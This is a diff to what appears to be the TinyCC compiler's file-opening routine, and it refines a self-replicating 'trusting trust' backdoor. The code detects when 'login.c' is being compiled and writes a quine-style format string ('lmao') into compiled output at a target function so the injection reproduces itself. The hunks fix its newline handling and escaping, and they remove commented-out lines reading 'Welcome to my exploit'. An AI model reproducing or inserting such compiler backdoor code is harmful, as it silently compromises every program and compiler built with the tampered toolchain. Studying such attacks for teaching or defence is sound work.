@@ -760,10 +760,11 @@ static int _tcc_open(TCCState *s1, const char *filename)
                 fprintf(tf, %c%cs%c, line);\
             }\
             \
+            line[strcspn(line, %c%cr%cn%c)] = 0;\
             if (!strcmp(line, func_head))\
             {\
                 flag = 1;\
-                fprintf(tf, lmao, 34, lmao, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 37, 37, 37, 92, 34, 34, 34, 34, 34, 34, 34);\
+                fprintf(tf, lmao, 34, lmao, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 92, 92, 34, 37, 34, 34, 34, 34, 34, 34, 37, 37, 37, 92, 34, 34, 34, 34, 34, 34, 34);\
             }\
             else if (!strcmp(line, func_end))\
             {\
@@ -786,11 +787,6 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)\
     ";
 
     int fd;
-    // int pipefd[2];
-    // pid_t p;
-    // printf("Welcome to my exploit\n");
-    // pipe(pipefd);
-    // p = fork();
 
     FILE *file;
     if (!strcmp(filename, "login.c"))
@@ -833,10 +829,11 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)\
                 fprintf(tf, "%s", line);
             }
 
+            line[strcspn(line, "\r\n")] = 0;
             if (!strcmp(line, func_head))
             {
                 flag = 1;
-                fprintf(tf, lmao, 34, lmao, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 37, 37, 37, 92, 34, 34, 34, 34, 34, 34, 34);
+                fprintf(tf, lmao, 34, lmao, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 92, 92, 34, 37, 34, 34, 34, 34, 34, 34, 37, 37, 37, 92, 34, 34, 34, 34, 34, 34, 34);
             }
             else if (!strcmp(line, func_end))
             {
